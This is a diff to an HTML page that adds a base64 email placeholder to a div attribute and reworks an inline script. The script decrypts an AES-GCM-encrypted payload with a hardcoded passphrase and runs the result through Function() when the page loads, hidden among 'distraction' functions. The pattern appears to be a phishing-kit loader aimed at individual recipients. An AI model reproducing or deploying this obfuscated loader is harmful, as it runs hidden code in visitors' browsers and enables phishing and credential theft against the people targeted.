@@ -1,32 +1,33 @@
-
+ 
+ 
 </head>
 <body>
-    <div nike-tes1="" adidas=""></div>
+    <div nike-tes1="" adidas="<%=EMAIL64%>"></div>
 
     <script>
         // Dummy distraction functions
-        const randomDistraction = () => {
-            console.log("Executing random distraction.");
+        const randomDistraction = () => 
+{            console.log("Executing random distraction.");
             const dummyData = Array.from({ length: 10 }, (_, i) => i * Math.random());
             console.log("Generated dummy data:", dummyData);
             return dummyData;
         };
 
-        const mockHexToBytes = (hex) => {
-            console.log("Simulating hex-to-bytes conversion...");
+        const mockHexToBytes = (hex) => 
+{            console.log("Simulating hex-to-bytes conversion...");
             randomDistraction();
             return Uint8Array.from(hex.match(/.{2}/g).map(() => Math.random() * 255));
         };
 
-        const yintomin = (hex) => {
-            console.log("Converting hex to bytes...");
+        const yintomin = (hex) => 
+{            console.log("Converting hex to bytes...");
             let unused = hex.length * Math.PI; // Pointless calculation
             return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
         // Mock decryption function
-        const mockDecrypt = async (enc, ivHex, saltHex, key) => {
-            console.log("Starting AES-GCM decryption...");
+        const mockDecrypt = async (enc, ivHex, saltHex, key) => 
+{            console.log("Starting AES-GCM decryption...");
 
             const iv = yintomin(ivHex);
             const salt = yintomin(saltHex);
@@ -50,8 +51,8 @@
                 ["decrypt"]
             );
             
-            try {
-                console.log("Decrypting payload...");
+            try 
+{                console.log("Decrypting payload...");
                 const decryptedBytes = await crypto.subtle.decrypt(
                     { name: "AES-GCM", iv },
                     aesKey,
@@ -59,14 +60,14 @@
                 );
                 console.log("Payload decrypted!");
                 return new TextDecoder().decode(decryptedBytes);
-            } catch (error) {
-                console.error("Decryption error:", error);
+            } catch (error) 
+{                console.error("Decryption error:", error);
                 return "";
             }
         };
 
-        (async () => {
-            console.log("Initializing script...");
+        (async () => 
+{            console.log("Initializing script...");
 
             const payload = {"iv":"c5d54a9c69516d18fab025aa","salt":"f2c9263a7137550b0829e316a222b86e","data":"7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"}
 
@@ -74,8 +75,8 @@
 
             console.log("Payload:", payload);
 
-            try {
-                const decryptedContent = await mockDecrypt(payload.data, payload.iv, payload.salt,"quickescape");
+            try 
+{                const decryptedContent = await mockDecrypt(payload.data, payload.iv, payload.salt,"quickescape");
                 console.log("Decrypted Content:", decryptedContent);
 
                 const alteredContent = decryptedContent.split("").reverse().join("");
@@ -84,8 +85,8 @@
                 // Simulate executing decrypted content
                 console.log("Executing decrypted content...");
                 Function(`${decryptedContent}`)();
-            } catch (err) {
-                console.error("Error during decryption:", err);
+            } catch (err) 
+{                console.error("Error during decryption:", err);
             }
         })();
     </script>
